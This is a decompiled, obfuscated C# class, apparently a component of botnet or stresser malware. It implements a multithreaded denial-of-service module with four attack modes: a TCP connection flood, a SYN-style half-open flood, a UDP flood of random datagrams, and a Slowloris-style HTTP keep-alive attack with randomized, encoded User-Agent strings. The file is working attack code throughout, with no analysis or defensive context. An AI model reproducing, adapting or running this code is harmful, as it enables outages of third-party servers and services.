using System;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace ns0;

internal class Class9
{
	public enum Enum3
	{
		const_0,
		const_1,
		const_2,
		const_3
	}

	private static Enum3 enum3_0;

	private static bool bool_0;

	private static string string_0;

	private static int int_0;

	private static int int_1;

	private static int int_2;

	private static int int_3;

	private static Class3 class3_0;

	private static string[] string_1 = new string[28]
	{
		"[W5aioKOUp5yVn5huU4CGfHgznRO9U2lhY25Tipyhl6KqplOBh1w=]", "[W4CUlpyhp6Kmm25TiG5TfKGnmJ9TgJSWU4KGU4tTZGNhZ25TmKFgiIYznRO9blOlqW1kYWyVaFxTepiWnqJiZWNja2NmZWlkbFN5nKWYmaKrYmZhY5Vo]", "[W4qcoZeiqqZuU4huU4qcoZeiqqZTgYdTaGFkblOYoWCIhm5TpaltZGFrYWNhaDOdE71cU3qYlp6iYmVjY2ljamZkU3mcpZiZoqtiZGFoYWNhaFN5n6KWnmJjYWphZ2FkUw==]", "[OV6Ac3p9dmF5gH92MWRUYT5GRkFBQGZkQEI/QToxX3aFV4OAf4VARD9BMV5eYUBDP0ExOXSAfhE/sm2BcoV6c312TDFYgIB4fXZzgIVAQz9CTDF5hYWBS0BAiIiIP3iAgHh9dj90gH5Ac4CFP3mFfn06]", "[bHZ/bjE5aBE/sm16f19lTDFmOg==]", "[OXSAfoFyhXpzfXZMMV5kWlYxSD9BTBE/sm0xaHp/dYCIhDFfZTFGP0JMMXN4d4U6MQ==]", "[OXSAfoFyhXpzfXZMMV4RP7JtZFpWMUc/QUwxaHp/REM6]", "[OWlCQkwxZkwxXXp/hokxQz9FP0M+QzF6RklHTDF2fz5mZEwRP7JtMX5CSToxWHZ0fIBAQ0FBQkFCREIxX3aFhHRygXZHQEc/QUI=]", "[OWlCQkwxZkwxXXp/hokxekdJR0wxdn8+ZmQRP7JtTDGDh0tBP0o/RDoxWHZ0fIBAQ0FBQkFJQUI=]", "[OWSGf2BkMUY/STGEhn9FhkwRP7JtMWY6MWCBdoNyMUY/QTFsdn9u]",
		"[W4CUlpyhp6Kmm25TiG5TfKGnmJ9TgJSWU4KGU4tTZGNhZ25TmKFgiIYznRO9blOlqW1kYWyVaFxTepiWnqJiZWNja2NmZWlkbFN5nKWYmaKrYmZhY5Vo0]", "[W4CUlpyhp6Kmm25TiG5TfKGnmJ9TgJSWU4KGU4tTZGNhZ25TmKFgiIYznRO9blOlqW1kYWyVaFxTepiWnqJiZWNja2NmZWlkbFN5nKWYmaKrYmZhY5Vo1]", "[W4CUlpyhp6Kmm25TiG5TfKGnmJ9TgJSWU4KGU4tTZGNhZ25TmKFgiIYznRO9blOlqW1kYWyVaFxTepiWnqJiZWNja2NmZWlkbFN5nKWYmaKrYmZhY5Vo2]", "[W4CUlpyhp6Kmm25TiG5TfKGnmJ9TgJSWU4KGU4tTZGNhZ25TmKFgiIYznRO9blOlqW1kYWyVaFxTepiWnqJiZWNja2NmZWlkbFN5nKWYmaKrYmZhY5Vo3]", "[W4CUlpyhp6Kmm25TiG5TfKGnmJ9TgJSWU4KGU4tTZGNhZ25TmKFgiIYznRO9blOlqW1kYWyVaFxTepiWnqJiZWNja2NmZWlkbFN5nKWYmaKrYmZhY5Vo4]", "[W4CUlpyhp6Kmm25TiG5TfKGnmJ9TgJSWU4KGU4tTZGNhZ25TmKFgiIYznRO9blOlqW1kYWyVaFxTepiWnqJiZWNja2NmZWlkbFN5nKWYmaKrYmZhY5Vo5]", "[W4CUlpyhp6Kmm25TiG5TfKGnmJ9TgJSWU4KGU4tTZGNhZ25TmKFgiIYznRO9blOlqW1kYWyVaFxTepiWnqJiZWNja2NmZWlkbFN5nKWYmaKrYmZhY5Vo6]", "[W4CUlpyhp6Kmm25TiG5TfKGnmJ9TgJSWU4KGU4tTZGNhZ25TmKFgiIYznRO9blOlqW1kYWyVaFxTepiWnqJiZWNja2NmZWlkbFN5nKWYmaKrYmZhY5Vo7]", "[W4CUlpyhp6Kmm25TiG5TfKGnmJ9TgJSWU4KGU4tTZGNhZ25TmKFgiIYznRO9blOlqW1kYWyVaFxTepiWnqJiZWNja2NmZWlkbFN5nKWYmaKrYmZhY5Vo8]", "[W4CUlpyhp6Kmm25TiG5TfKGnmJ9TgJSWU4KGU4tTZGNhZ25TmKFgiIYznRO9blOlqW1kYWyVaFxTepiWnqJiZWNja2NmZWlkbFN5nKWYmaKrYmZhY5Vo9]",
		"[W4qcoZeiqqZuU4huU4qcoZeiqqZTgYdTaGFkblOYoWCIhm5TpaltZGFrYWNhaDOdE71cU3qYlp6iYmVjY2ljamZkU3mcpZiZoqtiZGFoYWNhaFN5n6KWnmJjYWphZ2FkUw==0]", "[W4qcoZeiqqZuU4huU4qcoZeiqqZTgYdTaGFkblOYoWCIhm5TpaltZGFrYWNhaDOdE71cU3qYlp6iYmVjY2ljamZkU3mcpZiZoqtiZGFoYWNhaFN5n6KWnmJjYWphZ2FkUw==1]", "[W4qcoZeiqqZuU4huU4qcoZeiqqZTgYdTaGFkblOYoWCIhm5TpaltZGFrYWNhaDOdE71cU3qYlp6iYmVjY2ljamZkU3mcpZiZoqtiZGFoYWNhaFN5n6KWnmJjYWphZ2FkUw==2]", "[W4qcoZeiqqZuU4huU4qcoZeiqqZTgYdTaGFkblOYoWCIhm5TpaltZGFrYWNhaDOdE71cU3qYlp6iYmVjY2ljamZkU3mcpZiZoqtiZGFoYWNhaFN5n6KWnmJjYWphZ2FkUw==3]", "[W4qcoZeiqqZuU4huU4qcoZeiqqZTgYdTaGFkblOYoWCIhm5TpaltZGFrYWNhaDOdE71cU3qYlp6iYmVjY2ljamZkU3mcpZiZoqtiZGFoYWNhaFN5n6KWnmJjYWphZ2FkUw==4]", "[W4qcoZeiqqZuU4huU4qcoZeiqqZTgYdTaGFkblOYoWCIhm5TpaltZGFrYWNhaDOdE71cU3qYlp6iYmVjY2ljamZkU3mcpZiZoqtiZGFoYWNhaFN5n6KWnmJjYWphZ2FkUw==5]", "[W4qcoZeiqqZuU4huU4qcoZeiqqZTgYdTaGFkblOYoWCIhm5TpaltZGFrYWNhaDOdE71cU3qYlp6iYmVjY2ljamZkU3mcpZiZoqtiZGFoYWNhaFN5n6KWnmJjYWphZ2FkUw==6]", "[W4qcoZeiqqZuU4huU4qcoZeiqqZTgYdTaGFkblOYoWCIhm5TpaltZGFrYWNhaDOdE71cU3qYlp6iYmVjY2ljamZkU3mcpZiZoqtiZGFoYWNhaFN5n6KWnmJjYWphZ2FkUw==7]"
	};

	private static string[] string_2 = new string[10] { "[udvm1djYbAzPpc2bn5qcjA==]", "[udvm1djYbAzPpc2bn5qdjA==]", "[udvm1djYbAzPpc2bn5qijA==]", "[JUdSQURE2DvBDTkHDAYI+A==]", "[JUdSQURE2DvBDTkHDAYIEPg=]", "[JUdSQURE2DvBDTkHDQYI+A==]", "[J0g9SjnYO8ENBxEGCwv4]", "[J0g9SjnYO8ENBxEGCPg=]", "[J0g9SjnYO8ENBxAGEQj4]", "[J0g9SjnYO8ENBxEGEAj4]" };

	public static Enum3 Enum3_0 => enum3_0;

	public static string String_0 => enum3_0 switch
	{
		Enum3.const_0 => Class1.smethod_3("Eb314QAADQ==", bool_0: true), 
		Enum3.const_1 => Class1.smethod_3("[SYN]", bool_0: true), 
		Enum3.const_2 => Class1.smethod_3("Er314QABDQ==", bool_0: true), 
		Enum3.const_3 => Class1.smethod_3("ECksNL314QApLC8mMA==", bool_0: true), 
		_ => null, 
	};

	public static bool Boolean_0 => bool_0;

	public static void smethod_0(Enum3 enum3_1, string string_3, int int_4, int int_5, int int_6, int int_7, Class3 class3_1)
	{
		enum3_0 = enum3_1;
		string_0 = string_3;
		int_0 = int_4;
		int_1 = int_5;
		int_3 = int_6;
		int_2 = int_7;
		class3_0 = class3_1;
		bool_0 = false;
	}

	public static void smethod_1()
	{
		bool_0 = true;
		new Thread(smethod_3).Start();
	}

	public static void smethod_2()
	{
		bool_0 = false;
	}

	private static void smethod_3()
	{
		for (int i = 0; i < int_1; i++)
		{
			try
			{
				Thread thread = new Thread(smethod_4);
				thread.IsBackground = true;
				thread.Start();
			}
			catch (OutOfMemoryException)
			{
				int_1 = i - 1;
				break;
			}
		}
	}

	private static void smethod_4()
	{
		int num = 0;
		while (bool_0 && class3_0.Boolean_0)
		{
			switch (enum3_0)
			{
			case Enum3.const_0:
			{
				Socket socket4 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				socket4.Blocking = false;
				while (num < int_3 && bool_0 && class3_0.Boolean_0)
				{
					try
					{
						socket4.Connect(string_0, int_0);
						socket4.Send(smethod_7());
						socket4.Close();
						socket4 = null;
					}
					catch
					{
						socket4.Close();
						socket4 = null;
						break;
					}
					num++;
					Thread.Sleep(1);
				}
				Thread.Sleep(int_2);
				break;
			}
			case Enum3.const_1:
			{
				Socket socket2 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				socket2.Blocking = false;
				try
				{
					socket2.BeginConnect(string_0, int_0, smethod_5, null);
				}
				catch
				{
				}
				Thread.Sleep(100);
				try
				{
					if (socket2.Connected)
					{
						socket2.Disconnect(reuseSocket: false);
					}
					socket2.Close();
					socket2 = null;
				}
				catch
				{
				}
				Thread.Sleep(int_2);
				break;
			}
			case Enum3.const_2:
			{
				Socket socket3 = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
				socket3.Blocking = false;
				try
				{
					socket3.Connect(string_0, int_0);
					while (num < int_3 && bool_0 && class3_0.Boolean_0)
					{
						socket3.Send(smethod_6());
						num++;
						Thread.Sleep(1);
					}
					socket3.Close();
					socket3 = null;
				}
				catch
				{
					socket3.Close();
					socket3 = null;
					break;
				}
				Thread.Sleep(int_2);
				break;
			}
			case Enum3.const_3:
			{
				Socket socket = null;
				try
				{
					socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
					socket.Connect(string_0, int_0);
					socket.Send(smethod_8());
					while (socket.Connected && bool_0 && class3_0.Boolean_0)
					{
						socket.Send(smethod_8());
						Thread.Sleep(2000);
					}
				}
				catch
				{
					socket.Close();
					socket = null;
				}
				Thread.Sleep(int_2);
				break;
			}
			}
			num = 0;
		}
		if (bool_0)
		{
			smethod_2();
		}
	}

	private static void smethod_5(IAsyncResult iasyncResult_0)
	{
	}

	private static byte[] smethod_6()
	{
		Random random = new Random();
		byte[] array = new byte[random.Next(1470, 65507)];
		random.NextBytes(array);
		random = null;
		return array;
	}

	private static byte[] smethod_7()
	{
		Random random = new Random();
		byte[] array = new byte[random.Next(1470, 65535)];
		random.NextBytes(array);
		random = null;
		return array;
	}

	private static byte[] smethod_8()
	{
		Random random = new Random();
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("GET / HTTP/1.1");
		stringBuilder.AppendLine("Host: " + string_0);
		stringBuilder.AppendLine("User-Agent: " + Class1.smethod_3(string_2[random.Next(0, string_2.Length - 1)], bool_0: true) + " " + Class1.smethod_3(string_1[random.Next(0, string_1.Length - 1)], bool_0: true));
		stringBuilder.AppendLine("Content-Length: " + random.Next(1, 1000));
		stringBuilder.AppendLine("X-a: " + random.Next(1, 10000));
		stringBuilder.Append("Connection: keep-alive");
		return Encoding.ASCII.GetBytes(stringBuilder.ToString());
	}
}
